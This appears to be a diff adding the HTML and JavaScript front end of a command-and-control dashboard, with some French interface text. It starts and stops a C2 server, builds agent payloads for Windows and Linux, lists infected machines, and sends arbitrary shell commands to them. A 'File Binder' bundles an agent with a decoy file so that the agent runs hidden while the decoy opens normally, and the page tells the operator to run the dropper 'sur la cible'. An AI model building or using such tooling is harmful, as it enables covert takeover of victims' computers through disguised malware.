@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --primary: #3b82f6;
+            --primary-hover: #2563eb;
+            --success: #10b981;
+            --danger: #ef4444;
+            --danger-hover: #dc2626;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0;
+            padding: 2rem;
+            min-height: 100vh;
+            background-image:
+                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.15), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.15), transparent 25%);
+        }
+
+        .container { max-width: 1200px; margin: 0 auto; }
+
+        header { margin-bottom: 2rem; display: flex; align-items: center; gap: 1rem; }
+
+        h1 {
+            font-size: 2rem; font-weight: 700; margin: 0;
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .card:hover {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .card h2 {
+            font-size: 1.25rem; margin-top: 0; margin-bottom: 1.25rem;
+            border-bottom: 1px solid var(--border-color); padding-bottom: 0.75rem;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .status-badge {
+            display: inline-flex; align-items: center; gap: 0.5rem;
+            padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.875rem;
+            font-weight: 500; background: rgba(255, 255, 255, 0.05);
+        }
+
+        .status-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background-color: var(--text-muted);
+        }
+        .status-dot.active { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
+        .status-dot.inactive { background-color: var(--danger); }
+
+        .btn {
+            background: var(--primary); color: white; border: none;
+            padding: 0.5rem 1rem; border-radius: 8px; font-size: 0.875rem;
+            font-weight: 500; cursor: pointer; transition: all 0.2s; font-family: inherit;
+        }
+        .btn:hover { background: var(--primary-hover); }
+        .btn:active { transform: translateY(1px); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: var(--danger-hover); }
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: #059669; }
+
+        .form-group { margin-bottom: 1rem; }
+
+        label {
+            display: block; margin-bottom: 0.5rem;
+            font-size: 0.875rem; color: var(--text-muted);
+        }
+
+        select, input[type="text"], input[type="file"] {
+            width: 100%; background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color); color: white;
+            padding: 0.625rem; border-radius: 8px; font-family: inherit;
+            box-sizing: border-box; outline: none; transition: border-color 0.2s;
+        }
+        select:focus, input[type="text"]:focus, input[type="file"]:focus {
+            border-color: var(--primary);
+        }
+        input[type="file"] { cursor: pointer; }
+        input[type="file"]::file-selector-button {
+            background: var(--primary); color: white; border: none;
+            padding: 0.3rem 0.75rem; border-radius: 6px; cursor: pointer;
+            margin-right: 0.75rem; font-family: inherit; font-size: 0.875rem;
+        }
+
+        .terminal {
+            background: #000000; border-radius: 8px; padding: 1rem;
+            font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem;
+            color: #10b981; height: 150px; overflow-y: auto; margin-top: 1rem;
+            white-space: pre-wrap; border: 1px solid var(--border-color);
+        }
+
+        /* Agent table */
+        .agents-table {
+            width: 100%; border-collapse: collapse; font-size: 0.8rem;
+            max-height: 250px; display: block; overflow-y: auto;
+        }
+        .agents-table th {
+            text-align: left; padding: 0.5rem 0.75rem;
+            color: var(--text-muted); border-bottom: 1px solid var(--border-color);
+            position: sticky; top:0; background: var(--card-bg);
+        }
+        .agents-table td {
+            padding: 0.5rem 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .agents-table tr.clickable { cursor: pointer; }
+        .agents-table tr.clickable:hover { background: rgba(59, 130, 246, 0.1); }
+
+        .badge-online {
+            background: rgba(16, 185, 129, 0.15); color: var(--success);
+            padding: 0.1rem 0.5rem; border-radius: 9999px; font-size: 0.75rem;
+        }
+
+        .flex-row { display: flex; gap: 0.5rem; }
+        .mt-4 { margin-top: 1rem; }
+
+        /* Loading animation */
+        .loader {
+            border: 2px solid rgba(255, 255, 255, 0.1); border-left-color: var(--primary);
+            border-radius: 50%; width: 16px; height: 16px;
+            animation: spin 1s linear infinite; display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .info-text { font-size: 0.8rem; color: var(--text-muted); margin-top: 0.5rem; }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>C2 Dashboard</h1>
+        </header>
+
+        <div class="grid">
+            <!-- Server Card -->
+            <div class="card">
+                <h2>C2 Server <div class="status-badge" id="serverStatusBadge">
+                        <div class="status-dot inactive" id="serverStatusDot"></div>
+                        <span id="serverStatusText">Offline</span>
+                    </div>
+                </h2>
+                <div class="flex-row">
+                    <button class="btn" id="startServerBtn" onclick="startServer()">Start Server</button>
+                    <button class="btn btn-danger" id="stopServerBtn" onclick="stopServer()" disabled>Stop Server</button>
+                </div>
+                <div class="terminal mt-4" style="height: 80px;">
+                    Server logs managed by Python backend. Start the server above.
+                </div>
+            </div>
+
+            <!-- Agent Builder Card -->
+            <div class="card">
+                <h2>Agent Builder <div class="loader" id="buildLoader"></div></h2>
+                <div class="form-group">
+                    <label for="buildTarget">Target Architecture</label>
+                    <select id="buildTarget">
+                        <option value="windows" selected>Windows x86_64 (Native)</option>
+                        <option value="x86_64">Linux x86_64 (musl)</option>
+                        <option value="aarch64">Linux aarch64 (musl)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="outputName">Output Filename (Optional)</label>
+                    <input type="text" id="outputName" placeholder="e.g. system_update / agent.linux_x86_64">
+                </div>
+                <button class="btn" onclick="buildAgent()" id="buildBtn">Build Payload</button>
+                <div class="terminal" id="buildTerminal">Ready to build.</div>
+            </div>
+
+            <!-- Active Agents Card -->
+            <div class="card">
+                <h2>Active Agents
+                    <button class="btn" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;" onclick="refreshAgents()">Refresh</button>
+                </h2>
+                <table class="agents-table" id="agentsTable">
+                    <thead>
+                        <tr>
+                            <th>Agent ID</th>
+                            <th>First Seen</th>
+                            <th>Last Seen</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="agentsTbody">
+                        <tr><td colspan="4" style="color:var(--text-muted); text-align:center; padding:1rem;">No agents found.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- File Binder Card -->
+            <div class="card">
+                <h2>File Binder <div class="loader" id="binderLoader"></div></h2>
+                <p class="info-text">Combine ton agent avec un fichier leurre. En l'exécutant (<code>./fichier</code> ou <code>bash fichier</code>) l'agent démarre en arrière-plan et le leurre s'ouvre normalement.</p>
+                <div class="form-group">
+                    <label for="binderDecoy">Fichier leurre (n'importe quelle extension)</label>
+                    <input type="file" id="binderDecoy">
+                </div>
+                <div class="form-group">
+                    <label for="binderAgent">Agent compilé à implanter</label>
+                    <select id="binderAgent">
+                        <option value="">Chargement...</option>
+                    </select>
+                </div>
+                <button class="btn btn-success" onclick="generateBinder()" id="binderBtn">Générer le Dropper</button>
+                <div class="terminal" id="binderTerminal">En attente...</div>
+            </div>
+
+            <!-- Command Execution Card -->
+            <div class="card">
+                <h2>Execute Command <div class="loader" id="execLoader"></div></h2>
+                <div class="form-group">
+                    <label for="targetAgent">Target Agent ID</label>
+                    <select id="targetAgent">
+                        <option value="">Select an agent...</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="commandInput">Command</label>
+                    <div class="flex-row">
+                        <input type="text" id="commandInput" placeholder="e.g. ls -la /tmp"
+                            onkeypress="if(event.key === 'Enter') executeCommand()">
+                        <button class="btn" onclick="executeCommand()" id="execBtn">Send</button>
+                    </div>
+                </div>
+                <div class="terminal" id="execTerminal">Awaiting command...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API = '/api';
+
+        // ─── Server Management ────────────────────────────────────────────
+        async function checkServerStatus() {
+            try {
+                const res = await fetch(`${API}/server/status`);
+                const data = await res.json();
+                updateServerUI(data.running);
+            } catch (e) { console.error("Failed to fetch server status", e); }
+        }
+
+        function updateServerUI(isRunning) {
+            const dot = document.getElementById('serverStatusDot');
+            const text = document.getElementById('serverStatusText');
+            const startBtn = document.getElementById('startServerBtn');
+            const stopBtn = document.getElementById('stopServerBtn');
+            if (isRunning) {
+                dot.className = 'status-dot active'; text.innerText = 'Running';
+                startBtn.disabled = true; stopBtn.disabled = false;
+            } else {
+                dot.className = 'status-dot inactive'; text.innerText = 'Offline';
+                startBtn.disabled = false; stopBtn.disabled = true;
+            }
+        }
+
+        async function startServer() {
+            try { await fetch(`${API}/server/start`, { method: 'POST' }); checkServerStatus(); }
+            catch (e) { alert("Error starting server"); }
+        }
+
+        async function stopServer() {
+            try { await fetch(`${API}/server/stop`, { method: 'POST' }); checkServerStatus(); }
+            catch (e) { alert("Error stopping server"); }
+        }
+
+        // ─── Build Agent ──────────────────────────────────────────────────
+        async function buildAgent() {
+            const target = document.getElementById('buildTarget').value;
+            const outputName = document.getElementById('outputName').value.trim();
+            const term = document.getElementById('buildTerminal');
+            const btn = document.getElementById('buildBtn');
+            const loader = document.getElementById('buildLoader');
+
+            term.innerHTML = `<span style="color:#f59e0b">Building payload for ${target}... Please wait, first compile takes ~10 minutes.</span>`;
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+
+            try {
+                const startRes = await fetch(`${API}/agent/build/start`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target, output_name: outputName })
+                });
+                if (!startRes.ok) {
+                    const data = await startRes.json();
+                    term.innerHTML = `<span style="color:#ef4444">Failed to start build: ${data.message}</span>`;
+                    btn.disabled = false; loader.style.display = 'none';
+                    return;
+                }
+
+                const pollInterval = setInterval(async () => {
+                    try {
+                        const statRes = await fetch(`${API}/agent/build/status`);
+                        const statData = await statRes.json();
+                        if (statData.status === "success") {
+                            clearInterval(pollInterval);
+                            term.innerHTML = `<span style="color:#10b981">${statData.output || 'Build success!'}</span>`;
+                            btn.disabled = false; loader.style.display = 'none';
+                            loadBuiltAgents(); // refresh binder dropdown
+                        } else if (statData.status === "error") {
+                            clearInterval(pollInterval);
+                            term.innerHTML = `<span style="color:#ef4444">${statData.message || 'Build failed.'}</span>`;
+                            btn.disabled = false; loader.style.display = 'none';
+                        } else if (statData.status === "building") {
+                            if (term.innerHTML.length < 500) term.innerHTML += ".";
+                        }
+                    } catch (e) { /* ignore transient poll errors */ }
+                }, 3000);
+            } catch (e) {
+                term.innerHTML = `<span style="color:#ef4444">Network error during build start. Check server.</span>`;
+                btn.disabled = false; loader.style.display = 'none';
+            }
+        }
+
+        // ─── Active Agents Table ──────────────────────────────────────────
+        async function refreshAgents() {
+            const tbody = document.getElementById('agentsTbody');
+            const select = document.getElementById('targetAgent');
+            try {
+                const res = await fetch(`${API}/agents`);
+                const data = await res.json();
+
+                // The C2 server returns { data: { agents: [...] } }
+                const agents = (data.data && data.data.agents) ? data.data.agents : [];
+
+                if (agents.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="color:var(--text-muted); text-align:center; padding:1rem;">No agents found.</td></tr>';
+                    select.innerHTML = '<option value="">Select an agent...</option>';
+                    return;
+                }
+
+                tbody.innerHTML = '';
+                select.innerHTML = '<option value="">Select an agent...</option>';
+
+                const now = Date.now();
+                agents.forEach(agent => {
+                    const id_short = agent.id ? agent.id.substring(0, 8) + '…' : '?';
+                    const first = agent.created_at ? new Date(agent.created_at).toLocaleString() : '-';
+                    const lastDate = agent.last_seen_at ? new Date(agent.last_seen_at) : null;
+                    const last = lastDate ? lastDate.toLocaleString() : '-';
+                    // Consider online if last_seen within 60 seconds
+                    const isOnline = lastDate && (now - lastDate.getTime()) < 60000;
+                    const badge = isOnline
+                        ? '<span class="badge-online">● Online</span>'
+                        : '<span style="color:var(--text-muted);font-size:0.75rem;">Last seen ago</span>';
+
+                    tbody.innerHTML += `<tr class="clickable" onclick="selectAgent('${agent.id}')">
+                        <td title="${agent.id}"><span style="font-family:monospace;color:#a78bfa">${id_short}</span></td>
+                        <td>${first}</td>
+                        <td>${last}</td>
+                        <td>${badge}</td>
+                    </tr>`;
+                    select.innerHTML += `<option value="${agent.id}">${id_short} (${last})</option>`;
+                });
+            } catch (e) {
+                tbody.innerHTML = `<tr><td colspan="4" style="color:var(--danger); text-align:center; padding:1rem;">Erreur: ${e.message}</td></tr>`;
+            }
+        }
+
+        function selectAgent(id) {
+            document.getElementById('targetAgent').value = id;
+        }
+
+        // ─── File Binder ──────────────────────────────────────────────────
+        async function loadBuiltAgents() {
+            const sel = document.getElementById('binderAgent');
+            try {
+                const res = await fetch(`${API}/agents/built`);
+                const data = await res.json();
+                const agents = data.agents || [];
+                if (agents.length === 0) {
+                    sel.innerHTML = '<option value="">Aucun agent compilé trouvé</option>';
+                } else {
+                    sel.innerHTML = agents.map(a => `<option value="${a}">${a}</option>`).join('');
+                }
+            } catch (e) {
+                sel.innerHTML = '<option value="">Erreur de chargement</option>';
+            }
+        }
+
+        async function generateBinder() {
+            const decoyInput = document.getElementById('binderDecoy');
+            const agentSel = document.getElementById('binderAgent');
+            const term = document.getElementById('binderTerminal');
+            const btn = document.getElementById('binderBtn');
+            const loader = document.getElementById('binderLoader');
+
+            if (!decoyInput.files || decoyInput.files.length === 0) {
+                term.innerHTML = '<span style="color:#ef4444">Erreur : Sélectionne un fichier leurre d\'abord !</span>';
+                return;
+            }
+            if (!agentSel.value) {
+                term.innerHTML = '<span style="color:#ef4444">Erreur : Sélectionne un agent compilé !</span>';
+                return;
+            }
+
+            term.innerHTML = '<span style="color:#f59e0b">Génération du dropper en cours...</span>';
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+
+            try {
+                const formData = new FormData();
+                formData.append('decoy', decoyInput.files[0]);
+                formData.append('agent', agentSel.value);
+
+                const res = await fetch(`${API}/binder/create`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!res.ok) {
+                    const err = await res.json();
+                    term.innerHTML = `<span style="color:#ef4444">Erreur: ${err.message}</span>`;
+                    return;
+                }
+
+                // Trigger file download
+                const blob = await res.blob();
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = decoyInput.files[0].name;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+
+                term.innerHTML = `<span style="color:#10b981">✅ Dropper généré ! Fichier téléchargé : <strong>${decoyInput.files[0].name}</strong>
+Exécute-le sur la cible avec : <code>chmod +x ${decoyInput.files[0].name} && ./${decoyInput.files[0].name}</code>
+ou : <code>bash ${decoyInput.files[0].name}</code></span>`;
+            } catch (e) {
+                term.innerHTML = `<span style="color:#ef4444">Erreur réseau: ${e.message}</span>`;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+
+        // ─── Command Execution ────────────────────────────────────────────
+        async function executeCommand() {
+            const agent_id = document.getElementById('targetAgent').value;
+            const command = document.getElementById('commandInput').value;
+            const term = document.getElementById('execTerminal');
+            const btn = document.getElementById('execBtn');
+            const loader = document.getElementById('execLoader');
+
+            if (!agent_id || !command) return;
+
+            term.innerHTML = `<span style="color:#f59e0b">Sending command to ${agent_id.substring(0,8)}...</span>`;
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+
+            try {
+                const res = await fetch(`${API}/agents/exec`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agent_id, command })
+                });
+                const data = await res.json();
+                if (res.ok) {
+                    let text = data.output || "";
+                    if (data.error) text += "\n" + data.error;
+                    term.innerText = text;
+                } else {
+                    term.innerHTML = `<span style="color:#ef4444">${data.message || 'Execution failed.'}</span>`;
+                }
+            } catch (e) {
+                term.innerHTML = `<span style="color:#ef4444">Network error during execution.</span>`;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+                document.getElementById('commandInput').value = '';
+            }
+        }
+
+        // ─── Init ─────────────────────────────────────────────────────────
+        setInterval(checkServerStatus, 5000);
+        setInterval(refreshAgents, 10000);
+        checkServerStatus();
+        refreshAgents();
+        loadBuiltAgents();
+    </script>
+</body>
+
+</html>
